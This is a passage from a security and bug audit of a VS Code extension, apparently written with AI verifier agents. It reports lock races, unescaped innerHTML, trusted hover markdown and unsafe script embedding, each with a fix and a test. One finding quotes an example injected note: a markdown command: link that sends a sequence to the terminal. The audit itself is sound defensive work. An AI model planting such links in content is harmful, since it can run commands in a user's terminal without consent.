- **Severity / category:** 🟠 medium · bug
- **Trust:** ✅ confirmed (2 verifiers)
- **Status:** `[x]` complete

**Problem.** acquireLock treats any lock older than 10s as stale and deletes it, but the lock holder's `update` callback is allowed to be async (`T | Promise<T>`) with no time bound. If writer A's update takes >10s (slow disk, large store, awaited work), writer B deletes A's live lock and acquires its own; both then write, and one read-modify-write cycle is silently lost. Worse, A's finally block unconditionally `rm`s the lock path — which at that point is B's lock — so a third writer C can acquire while B is still inside its critical section, compounding the lost-update window.

**Evidence.**

```ts
const stat = await fs.promises.stat(lockPath);
        if (Date.now() - stat.mtimeMs > 10_000) await fs.promises.rm(lockPath, { force: true });
...
  } finally {
    await lock.close().catch(() => undefined);
    await fs.promises.rm(lockPath, { force: true }).catch(() => undefined);
```

**Fix.** Write an owner token (pid + random nonce) into the lock file on acquire; on release, read the lock and only rm it if the token matches. For staleness, either verify the owning pid is dead (process.kill(pid, 0)) before stealing, or have the holder touch the lock's mtime on an interval while update() runs.

<details><summary>Verifier notes</summary>

- Verified directly in sidekick-shared/src/writers/atomic.ts: the lock holder never refreshes the lock file's mtime (the FileHandle is opened wx and never written/touched), acquireLock deletes any lock >10s old with no pid/owner check (line 66), and the finally block unconditionally rm's lockPath (line 53) without verifying ownership — so after a steal, holder A's release deletes thief B's lock, admitting a third writer C. The update signature explicitly permits unbounded async work (T | Promise<T>) and the function is exported from the package index for external npm consumers, so no type constraint or guard elsewhere prevents the race; the concurrency test only covers ≤2ms callbacks.
- The code mechanics are exactly as claimed (unconditional stale rm at line 66, unconditional finally rm at line 53, no owner token, no mtime heartbeat), but the headline trigger is not reachable: every caller (4 shared writers + PersistenceService.mergeStoreForSave overrides) passes a synchronous in-memory merge over KB-sized stores, so lock holds are milliseconds against a 10s threshold, and waiters give up after 3s. A meaningful defect remains via two constructible triggers the missing-ownership design still permits: (1) wall-clock staleness — a system suspend landing inside a debounced-save window makes a live lock look >10s stale on wake, letting the concurrently-running CLI steal it while the extension host's resumed save later clobbers and rm's the thief's lock; (2) a double-steal TOCTOU on genuinely orphaned locks (the designed recovery path), where two contending waiters both stat the orphan as stale and the second's rm deletes the first's freshly created lock, giving two live lock holders. Both yield a silently lost write to ~/.config/sidekick stores, but they are rare interleavings, so severity is low rather than medium.

</details>

**Verification:** `atomic.test.ts` replaces a held lock with another owner token and proves the original writer does not remove the replacement lock.

---

### P1-14 — Plan steps, step error messages, and plan-history titles rendered into innerHTML unescaped

- **Location:** `sidekick-vscode/src/providers/DashboardViewProvider.ts:8921`
- **Severity / category:** 🟠 medium · bug
- **Trust:** ⚠️ unverified — re-check first
- **Status:** `[x]` complete

**Problem.** The 'updatePlan' handler builds plan-step rows with step.description and step.errorMessage (line 8917) concatenated raw into innerHTML, and the 'updatePlanHistory' handler does the same with rp.title (line 8984). Plan step descriptions/titles come from session plan markdown (LLM/user-authored content parsed from JSONL). A step description containing '<' (e.g. 'Add Foo<T> generic' or markup) is parsed as HTML: text vanishes or arbitrary markup is injected into the dashboard. Notably renderPlanMarkdown right above (line 8310) has an esc() helper and escapes everything — this path simply forgot to.

**Evidence.**

```ts
+ '<span class="plan-step-desc">' + step.description + '</span>'  ...and...  const errorHtml = step.errorMessage ? '<div style="...">' + step.errorMessage.substring(0, 100) + '</div>' : '';
```

**Fix.** Wrap all session-derived strings in these two handlers with escapeHtml(): escapeHtml(step.description), escapeHtml(step.errorMessage.substring(0,100)), escapeHtml(rp.title).

**Before you fix:** this finding was not adversarially verified (its verifier agents hit a session limit). Re-read the cited code and confirm the failure is real and reachable before changing anything; if it does not hold, mark Status `[-]` with a one-line reason.

**Verification:** `DashboardViewProvider.test.ts` checks generated webview code escapes step descriptions, step errors, and recent-plan titles before HTML insertion.

---

### P1-15 — Third-party promoclock.co strings injected into webview innerHTML unescaped

- **Location:** `sidekick-vscode/src/providers/DashboardViewProvider.ts:7295`
- **Severity / category:** 🟠 medium · bug
- **Trust:** ⚠️ unverified — re-check first
- **Status:** `[x]` complete

**Problem.** updatePeakHours concatenates status.label and status.peakHoursDescription — data fetched from the third-party promoclock.co API by PeakHoursService (the HTML itself labels it 'third-party, unaffiliated') — directly into innerHTML with no escaping. If that remote service returns markup (compromise, format change, or malicious response), it is parsed as HTML inside the trusted dashboard. CSP blocks script execution, but arbitrary markup/UI spoofing inside the extension's panel is still possible from a network source the project does not control.

**Evidence.**

```ts
indicatorEl.innerHTML =
          '<span style="color: var(--vscode-charts-orange, var(--vscode-charts-yellow))">' +
          dot + '</span> ' +
          (status.label || 'Peak Hours');
... if (status.peakHoursDescription) { html += status.peakHoursDescription; }
        detailsEl.innerHTML = html;
```

**Fix.** Escape both remote strings: use escapeHtml(status.label) and escapeHtml(status.peakHoursDescription), or build the nodes with createElement/textContent.

**Before you fix:** this finding was not adversarially verified (its verifier agents hit a session limit). Re-read the cited code and confirm the failure is real and reachable before changing anything; if it does not hold, mark Status `[-]` with a one-line reason.

**Verification:** `DashboardViewProvider.test.ts` checks both third-party peak-hours label and description pass through `escapeHtml`.

---

### P1-16 — detectBaseBranch mangles slashed upstream branches (origin/feature/foo -> foo)

- **Location:** `sidekick-vscode/src/services/PrDescriptionService.ts:195`
- **Severity / category:** 🟠 medium · bug
- **Trust:** ⚠️ unverified — re-check first
- **Status:** `[x]` complete

**Problem.** To strip the remote name from `git rev-parse --abbrev-ref @{u}` output the code takes the LAST path segment. For any upstream branch containing a slash the result is wrong. Failure scenario: branch tracks `origin/release/2.x` -> pop() yields `2.x` -> getBranchCommits runs `git log 2.x..HEAD` against a nonexistent local ref -> execGit rejects -> getBranchCommits returns [] -> user sees 'No commits found on current branch vs 2.x. Are you on a feature branch?' and PR description generation fails even though the branch has commits.

**Evidence.**

```ts
const upstream = result.trim();
      const branchName = upstream.split('/').pop() || 'main';
```

**Fix.** Strip only the first segment (the remote): `const branchName = upstream.replace(/^[^/]+\//, '') || 'main';` — or keep the full upstream ref (e.g. `origin/release/2.x`) and diff against it directly, which is also more correct when the local base branch is stale.

**Before you fix:** this finding was not adversarially verified (its verifier agents hit a session limit). Re-read the cited code and confirm the failure is real and reachable before changing anything; if it does not hold, mark Status `[-]` with a one-line reason.

**Verification:** `PrDescriptionService.test.ts` returns `origin/feature/foo` from upstream detection and proves that complete ref reaches branch comparison.

---

### P1-17 — quota-snapshots.json read-modify-write races across processes, losing snapshots

- **Location:** `sidekick-shared/src/quotaSnapshots.ts:119`
- **Severity / category:** ⚪ low · bug
- **Trust:** ✅ confirmed (2 verifiers)
- **Status:** `[x]` complete

**Problem.** writeQuotaSnapshot does readStore() then writeStore() of the entire store with no cross-process lock. The VS Code extension, the CLI dashboard, and external sidekick-shared consumers all write this file concurrently (Claude poller, CodexQuotaWatcher on every rollout change, zai resolver). Interleaving: process A reads the store, process B writes an updated codex record, A writes back its zai record on top of the pre-B store -> B's fresher codex snapshot is silently discarded, so a later cache fallback serves older data than was actually captured.

**Evidence.**

```ts
export function writeQuotaSnapshot(
  providerId: QuotaSnapshotProviderId,
  accountId: string,
  quota: QuotaState,
): void {
  const store = readStore();
  const index = store.snapshots.findIndex(
    (item) => item.providerId === providerId && item.accountId === accountId,
  );
```

**Fix.** Store each (providerId, accountId) snapshot in its own file (like quota-history does) so writes never clobber unrelated records, or take a lightweight lockfile (mkdir/O_EXCL with retry) around the read-modify-write.

<details><summary>Verifier notes</summary>

- writeQuotaSnapshot (quotaSnapshots.ts:119) performs an unlocked read-modify-write of the whole single-file store; atomicWriteJson's temp+rename prevents corruption but not lost updates. Concurrent cross-process writers are the product's normal mode: the extension (QuotaService Claude poller, CodexSessionProvider, OpenCodeSessionProvider/resolveZaiQuota, DashboardViewProvider/resolveCodexQuota) and the CLI (quota/mcp commands) all write the same file, plus multiple VS Code windows. The codebase itself has updateJsonStoreAtomic (writers/atomic.ts:33, lockfile-serialized RMW "across Sidekick processes") used by tasks/notes/decisions/errorHistory stores but not by quotaSnapshots, and the concurrency test at quotaSnapshots.test.ts:200 only asserts worker exit status, never that all records survive — so nothing refutes the lost-update race.
- The read-modify-write in writeQuotaSnapshot (quotaSnapshots.ts:119-150) has no cross-process serialization, and concurrent multi-process writers are a normal deployment state: the extension host writes claude-code/codex/zai snapshots on timers and session events while the long-running `sidekick mcp` server or `sidekick quota` command (or a second VS Code window) writes via resolveCodexQuota/resolveZaiQuota. The lost-update interleaving is therefore reachable, though the collision window is the sub-millisecond synchronous RMW span, writes are throttled (60s history min-interval, 300s Claude poll), the reverted record self-heals on the next write, and reads already flag snapshots stale/cache — so the impact is transient staleness, consistent with the claimed low severity.

</details>

**Verification:** `quotaSnapshots.test.ts` launches 12 concurrent processes and proves all 12 provider/account records survive in the shared store.

---

### P1-18 — Store readers crash with TypeError on schema-drifted JSON instead of tolerating it

- **Location:** `sidekick-shared/src/readers/tasks.ts:20`
- **Severity / category:** ⚪ low · bug
- **Trust:** ✅ confirmed (2 verifiers)
- **Status:** `[x]` complete

**Problem.** readJsonStore returns any truthy parsed JSON without shape validation, and the readers immediately dereference nested containers: readTasks does Object.values(store.tasks), readDecisions does Object.values(store.decisions), readNotes does Object.entries(store.notesByFile). A store file written by a different version (or hand-edited, or an object missing the key, e.g. `{"schemaVersion":1}`) makes Object.values(undefined) throw 'Cannot convert undefined or null to object'. Some consumers swallow it (StaticDataLoader `.catch(() => [])`), but any direct consumer of the public API (it's exported from index.ts) gets a crash instead of the documented 'missing or malformed → empty' behavior.

**Evidence.**

```ts
const store = await readProjectJsonStore<TaskPersistenceStore>(project, 'tasks');
  if (!store) return [];

  let tasks = Object.values(store.tasks);
```

**Fix.** Guard the container shape in each reader before iterating, e.g. `const tasks = store.tasks && typeof store.tasks === 'object' ? Object.values(store.tasks) : []` (same for decisions and notesByFile), or validate in readJsonStore via a per-store type guard and return null on mismatch.

<details><summary>Verifier notes</summary>

- Verified readJsonStore (helpers.ts:11-18) returns any truthy JSON.parse result with no shape check despite documenting "missing or malformed → null", and all three readers immediately dereference nested containers (tasks.ts:20, decisions.ts:22, notes.ts:32/43); Object.values(undefined) does throw TypeError. No guard, type constraint, or writer-side healing prevents a schema-drifted or hand-edited file (e.g. {"schemaVersion":1}) from hitting this path, and the readers are exported as public API from index.ts in the independently published sidekick-shared package. The only inaccuracy is impact framing: every in-repo consumer handles the rejection (StaticDataLoader swallows it, CLI commands catch and exit 1 with the TypeError message, MCP handlers sit behind the SDK boundary), so the uncaught-crash exposure is limited to external package consumers.
- Code behavior verified: readTasks/readDecisions/readNotes dereference store containers with no shape guard, while sibling readPlans guards with Array.isArray, and readJsonStore's documented contract is malformed→null. However, no writer in the product can produce the failing shape (the extension always writes the container; corrupt/truncated writes fail JSON.parse and are already tolerated), so the trigger requires a hand-edited/externally modified store file or future schema drift — a real but narrow input class the codebase elsewhere explicitly tolerates. All in-repo consumers catch the error (CLI prints 'Error: Cannot convert undefined or null to object' and exits 1; MCP wraps handler throws), so the impact is a contract violation with a cryptic error, not an uncaught crash, except for external npm consumers without their own catch.

</details>

**Verification:** task, decision, and note reader tests feed null/array/non-array drifted containers and all resolve to safe empty results.

---

### P1-19 — Knowledge note hover markdown is trusted, enabling command: links from note content

- **Location:** `sidekick-vscode/src/providers/KnowledgeNoteDecorationProvider.ts:118`
- **Severity / category:** ⚪ low · improvement
- **Trust:** 🟡 plausible (1 verifier)
- **Status:** `[x]` complete

**Problem.** buildHoverMarkdown sets md.isTrusted = true and then appends raw note.title/content/tags into the MarkdownString. Trusted markdown in VS Code allows `command:` URIs to execute arbitrary extension/workbench commands when clicked. Notes are not guaranteed to be hand-typed by the user (the note.source field is rendered, implying agent-originated notes exist), so a prompt-injected agent could plant a note like `[see docs](command:workbench.action.terminal.sendSequence?...)` that executes on a hover click. Nothing in the hover actually needs command links — trust is pure attack surface here.

**Evidence.**

```ts
const md = new vscode.MarkdownString();
    md.isTrusted = true;
    ...
    md.appendMarkdown(`${note.content}\n\n`);
```

**Fix.** Remove `md.isTrusted = true` (default untrusted disables command links), or use appendText for user/agent-controlled fields (content, title, tags) if literal rendering is acceptable.

**Before you fix:** this finding was only single-verified. Re-read the cited code and confirm the failure is real and reachable before changing anything; if it does not hold, mark Status `[-]` with a one-line reason.

**Verification:** `KnowledgeNoteDecorationProvider.test.ts` renders a `command:` link and proves the resulting markdown is not trusted.

---

### P1-20 — changelogData embedded with plain JSON.stringify instead of _safeJsonForScript

- **Location:** `sidekick-vscode/src/providers/DashboardViewProvider.ts:6360`
- **Severity / category:** ⚪ low · bug
- **Trust:** ⚠️ unverified — re-check first
- **Status:** `[x]` complete

**Problem.** The provider defines _safeJsonForScript (line 2539) precisely to escape '</script>' and U+2028/U+2029 when embedding JSON in the inline <script>, and uses it for __initialSessionData (line 6250) — but the changelog embed 60 lines later uses raw JSON.stringify. If any of the 5 most recent CHANGELOG.md entries ever contains the literal text '</script>' (plausible when documenting webview/CSP fixes) or a U+2028 character, the HTML parser terminates the script early and the ENTIRE dashboard webview fails to initialize (blank panel).

**Evidence.**

```ts
const changelogData = ${JSON.stringify(changelogEntries)};
```

**Fix.** Use the existing helper: const changelogData = ${this._safeJsonForScript(changelogEntries)};

**Before you fix:** this finding was not adversarially verified (its verifier agents hit a session limit). Re-read the cited code and confirm the failure is real and reachable before changing anything; if it does not hold, mark Status `[-]` with a one-line reason.

**Verification:** `DashboardViewProvider.test.ts` exercises `_safeJsonForScript` with a script-closing payload and proves no literal `</script>` remains.

---
